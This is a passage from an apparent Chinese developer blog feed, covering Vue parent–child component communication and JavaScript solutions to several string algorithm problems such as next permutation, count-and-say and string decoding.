class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">import</span> child <span class="token keyword">from</span> <span class="token string">'./child'</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  data <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>      msg<span class="token punctuation">:</span> <span class="token string">''</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  components<span class="token punctuation">:</span> <span class="token punctuation">{</span>    child  <span class="token punctuation">}</span><span class="token punctuation">,</span>  methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token keyword">get</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>msg <span class="token operator">=</span> msg    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>子组件<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>template<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"msg"</span> @input<span class="token operator">=</span><span class="token string">"set"</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'child'</span><span class="token punctuation">,</span>  data <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>      msg<span class="token punctuation">:</span> <span class="token string">''</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token keyword">set</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'transfer'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>msg<span class="token punctuation">)</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>    <span class="token number">23131</span> <span class="token comment" spellcheck="true">//输入框</span>    我是父组件：这是子组件传来的值：<span class="token number">23131</span><span class="token operator">--</span><span class="token operator">></span></code></pre><h2 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h2><p><a href="https://www.jinjingxuan.com/2020/10/22/Vue-Vuex/" target="_blank" rel="noopener">vuex</a></p><h2 id="event-bus"><a href="#event-bus" class="headerlink" title="event bus"></a>event bus</h2><p>一个完整的eventBus主要分为三个部分：<strong>eventBus组件、注册事件（$on）、发送事件（$emit）</strong></p><h2 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h2><p>父组件通过v-model传递值给子组件时，会自动传递一个value的prop属性，在子组件中通过this.$emit(‘input’,val)自动修改v-model绑定的值</p><pre class=" language-js"><code class="language-js">Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'child'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>    props<span class="token punctuation">:</span><span class="token punctuation">{</span>      value<span class="token punctuation">:</span>String<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//v-model会自动传递一个字段为value的prop属性</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token punctuation">{</span>        mymessage<span class="token punctuation">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>value      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    methods<span class="token punctuation">:</span><span class="token punctuation">{</span>      <span class="token function">changeValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>mymessage<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过如此调用可以改变父组件上v-model绑定的值</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    template<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`      &lt;div>        &lt;input type="text" v-model="mymessage" @change="changeValue">      &lt;/div>  })  Vue.component('parent',{    template:`</span></span>      <span class="token operator">&lt;</span>div<span class="token operator">></span>        <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token keyword">this</span> is parent compoent<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>        <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token punctuation">{</span><span class="token punctuation">{</span>message<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>        <span class="token operator">&lt;</span>child v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"message"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>child<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    `<span class="token punctuation">,</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token punctuation">{</span>        message<span class="token punctuation">:</span><span class="token string">'hello'</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-字符串操作</title>
      <link href="2020/11/10/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/"/>
      <url>2020/11/10/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<ul><li>下一个排列</li><li>对输入的字符串，去除其中的字符’b’以及连续出现的’a’和’c’</li><li>外观数列</li><li>最长公共前缀</li><li>字符串的最大非重复子串长度</li><li>参数分解</li><li>字符串解码</li></ul><h2 id="下一个排列"><a href="#下一个排列" class="headerlink" title="下一个排列"></a>下一个排列</h2><ul><li><p>题目来源：<a href="https://leetcode-cn.com/problems/next-permutation/" target="_blank" rel="noopener">leetcode31</a></p></li><li><p>参考题解：<a href="https://leetcode-cn.com/problems/next-permutation/solution/si-lu-zui-qing-xi-de-ti-jie-by-heroding/" target="_blank" rel="noopener">思路最清晰的题解</a></p></li></ul><pre class=" language-js"><code class="language-js">实现获取下一个排列的函数，算法需要将给定数字序列重新排列成字典序中下一个更大的排列。如果不存在下一个更大的排列，则将数字重新排列成最小的排列（即升序排列）。必须原地修改，只允许使用额外常数空间。以下是一些例子，输入位于左侧列，其相应输出位于右侧列。<span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> → <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span> → <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span> → <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span></code></pre><ul><li>分析：就相当于找一个比当前数大并且最小的一个，比如比123大的有132,213,231,321,312，但是最小的是132</li><li>思路：<ul><li>从后向前遍历，找到nums[i] &lt; nums[i+1]的数，记录下i需要交换</li><li>交换的对象应该是比他大但是最小的一个，只需从后向前遍历找即可，因为i后面已经是降序</li><li>交换后打乱了序列，应该将 i 后面的序列重新排序</li><li>注意题目要求，只能在原数组上改，用 nums = nums.concat的一些操作会有问题，最好还是用splice,push,unshift这些修改原数组的方法</li></ul></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> nextPermutation <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            flag <span class="token operator">=</span> <span class="token boolean">false</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j <span class="token operator">></span> i<span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">let</span> tmp <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                    nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> nums <span class="token punctuation">[</span>i<span class="token punctuation">]</span>                    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmp                    <span class="token keyword">break</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">let</span> a <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>            nums<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> a<span class="token operator">-</span>b<span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">{</span>        nums<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="对输入的字符串，去除其中的字符’b’以及连续出现的’a’和’c’"><a href="#对输入的字符串，去除其中的字符’b’以及连续出现的’a’和’c’" class="headerlink" title="对输入的字符串，去除其中的字符’b’以及连续出现的’a’和’c’"></a>对输入的字符串，去除其中的字符’b’以及连续出现的’a’和’c’</h2><pre class=" language-js"><code class="language-js"><span class="token string">'aacbd'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'ad'</span><span class="token string">'aabcd'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'ad'</span><span class="token string">'aaabbccc'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span></code></pre><ul><li>正则解决</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> res<span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/b+/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/(ac)+/</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        res <span class="token operator">=</span> res<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/ac/</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span></code></pre><h2 id="外观数列"><a href="#外观数列" class="headerlink" title="外观数列"></a>外观数列</h2><h3 id="正则表达式：-1捕获"><a href="#正则表达式：-1捕获" class="headerlink" title="正则表达式：\1捕获"></a>正则表达式：\1捕获</h3><blockquote><p>\1表示匹配第一个括号里的内容</p><p>利用这个\1，可以获取一个长字符串中的最长相同子串</p></blockquote><pre class=" language-js"><code class="language-js">    <span class="token comment" spellcheck="true">//寻找连续相同的最长子串</span>    <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">"ABCCCDDDDDEFFFFFFFFFFFFGGGGHHIIII"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex">/(\w)\1+/g</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> arr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// ["CCC", "DDDDD", "FFFFFFFFFFFF", "GGGG", "HH", "IIII"]</span></code></pre><h3 id="外观数列-1"><a href="#外观数列-1" class="headerlink" title="外观数列"></a>外观数列</h3><pre class=" language-js"><code class="language-js"><span class="token number">1</span><span class="token punctuation">.</span>     <span class="token number">1</span><span class="token number">2</span><span class="token punctuation">.</span>     <span class="token number">11</span><span class="token number">3</span><span class="token punctuation">.</span>     <span class="token number">21</span><span class="token number">4</span><span class="token punctuation">.</span>     <span class="token number">1211</span><span class="token number">5</span><span class="token punctuation">.</span>     <span class="token number">111221</span>给定一个正整数 n（<span class="token number">1</span> ≤ n ≤ <span class="token number">30</span>），输出外观数列的第 n 项。</code></pre><ul><li>利用正则表达式</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> countAndSay <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> pre <span class="token operator">=</span> <span class="token string">'1'</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        pre <span class="token operator">=</span> pre<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(\d)\1*/g</span><span class="token punctuation">,</span> item <span class="token operator">=</span><span class="token operator">></span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>item<span class="token punctuation">.</span>length<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> pre<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//  \1*代表出现任意次</span><span class="token comment" spellcheck="true">// ${}代表字符串拼接</span><span class="token comment" spellcheck="true">// replace第二个参数为函数例如</span><span class="token keyword">var</span> str1 <span class="token operator">=</span> <span class="token string">'abbcbca'</span>str1<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(b)/g</span><span class="token punctuation">,</span>item <span class="token operator">=</span><span class="token operator">></span> item<span class="token operator">+</span><span class="token string">'*'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//ab*b*cb*ca</span></code></pre><h2 id="算法：最长公共前缀"><a href="#算法：最长公共前缀" class="headerlink" title="算法：最长公共前缀"></a>算法：最长公共前缀</h2><pre class=" language-js"><code class="language-js">编写一个函数来查找字符串数组中的最长公共前缀。如果不存在公共前缀，返回空字符串 <span class="token string">""</span>。示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"flower"</span><span class="token punctuation">,</span><span class="token string">"flow"</span><span class="token punctuation">,</span><span class="token string">"flight"</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token string">"fl"</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"dog"</span><span class="token punctuation">,</span><span class="token string">"racecar"</span><span class="token punctuation">,</span><span class="token string">"car"</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token string">""</span>解释<span class="token punctuation">:</span> 输入不存在公共前缀。</code></pre><ul><li>当字符串数组长度为 0 时则公共前缀为空，直接返回</li><li>令最长公共前缀 ans 的值为第一个字符串，进行初始化</li><li>遍历后面的字符串，依次将其与 ans 进行比较，两两找出公共前缀，最终结果即为最长公共前缀</li><li>如果查找过程中出现了 ans 为空的情况，则公共前缀不存在直接返回</li><li>时间复杂度：O(s)，s 为所有字符串的长度之和</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> longestCommonPrefix <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>strs<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>strs<span class="token punctuation">.</span>length<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">""</span>    <span class="token keyword">let</span> ans <span class="token operator">=</span> strs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>strs<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>ans<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>strs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!==</span>ans<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                ans <span class="token operator">=</span> ans<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ans<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="字符串的最大非重复子串长度"><a href="#字符串的最大非重复子串长度" class="headerlink" title="字符串的最大非重复子串长度"></a>字符串的最大非重复子串长度</h2><p>js中，因为Array继承Object，那么Array也是可以用字符串作为数组下标的 ，c++可以，写一个参考的C++解法</p><pre class=" language-c++"><code class="language-c++">int lengthOfLongestSubstring(string s) {        vector dict(256, -1);        int maxLen = 0, start = -1;        for (int i = 0; i != s.length(); i++) {            if (dict[s[i]] > start)//当前字符“曾经”是否出现在此子串中？                start = dict[s[i]];//“曾经”出现那次作为新起点            dict[s[i]] = i;//标志该字符出现的位置            maxLen = max(maxLen, i - start);//每次都要更新最大长度        }        return maxLen;}</code></pre><p>例如：a,b,c,d,a,b,a 输出4</p><p>无重复：a,b,c,d</p><p>a重复了：把上一个a之前的清除，现在b,c,d,a</p><p>b重复了：把上一个b之前的清除，现在c,d,a,b</p><p>a重复了：现在b,a</p><h2 id="参数分解"><a href="#参数分解" class="headerlink" title="参数分解"></a>参数分解</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">"x=1&amp;&amp;y=2&amp;&amp;y=3&amp;&amp;z=4&amp;&amp;y=4"</span><span class="token comment" spellcheck="true">//输出</span><span class="token comment" spellcheck="true">// obj = {</span><span class="token comment" spellcheck="true">//     x:1,</span><span class="token comment" spellcheck="true">//     y:[2,3],</span><span class="token comment" spellcheck="true">//     z:4</span><span class="token comment" spellcheck="true">// }</span><span class="token keyword">let</span> tmp <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;&amp;"</span><span class="token punctuation">)</span><span class="token keyword">let</span> left <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">let</span> right <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">)</span><span class="token punctuation">{</span>    left<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    right<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> left<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果包含重复元素</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果已经是数组就直接添加</span>            res<span class="token punctuation">[</span>left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果不是数组则构造成数组</span>            <span class="token keyword">let</span> tmp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            tmp<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//push的返回值为push的值</span>            res<span class="token punctuation">[</span>left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        res<span class="token punctuation">[</span>left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> right<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token punctuation">}</span>   <span class="token punctuation">}</span></code></pre><h2 id="字符串解码"><a href="#字符串解码" class="headerlink" title="字符串解码"></a>字符串解码</h2><ul><li><a href="https://leetcode-cn.com/problems/decode-string/" target="_blank" rel="noopener">leetcode394</a></li></ul><pre class=" language-js"><code class="language-js">示例 <span class="token number">1</span>：输入：s <span class="token operator">=</span> <span class="token string">"3[a]2[bc]"</span>输出：<span class="token string">"aaabcbc"</span>示例 <span class="token number">2</span>：输入：s <span class="token operator">=</span> <span class="token string">"3[a2[c]]"</span>输出：<span class="token string">"accaccacc"</span>示例 <span class="token number">3</span>：输入：s <span class="token operator">=</span> <span class="token string">"2[abc]3[cd]ef"</span>输出：<span class="token string">"abcabccdcdcdef"</span>示例 <span class="token number">4</span>：输入：s <span class="token operator">=</span> <span class="token string">"abc3[cd]xyz"</span>输出：<span class="token string">"abccdcdcdxyz"</span></code></pre><ul><li>采用正则表达式将<code>3[a]</code> 的格式转换成<code>aaa</code>即可</li><li>匹配到<code>3[a]</code>之后，找到<code>[</code>的位置，前面为数字，后面为字符，按次数拼接</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> decodeString <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> reg <span class="token operator">=</span> <span class="token regex">/\d+\[[a-z]+\]/g</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>reg<span class="token punctuation">,</span> item <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> pos  <span class="token operator">=</span> item<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span> <span class="token punctuation">,</span>number <span class="token operator">=</span> item<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pos<span class="token punctuation">)</span>            <span class="token keyword">let</span> str <span class="token operator">=</span> item<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> item<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> res <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> number<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> res <span class="token operator">+</span><span class="token operator">=</span> str            <span class="token keyword">return</span> res        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> s<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>服务端渲染与nuxtJs</title>
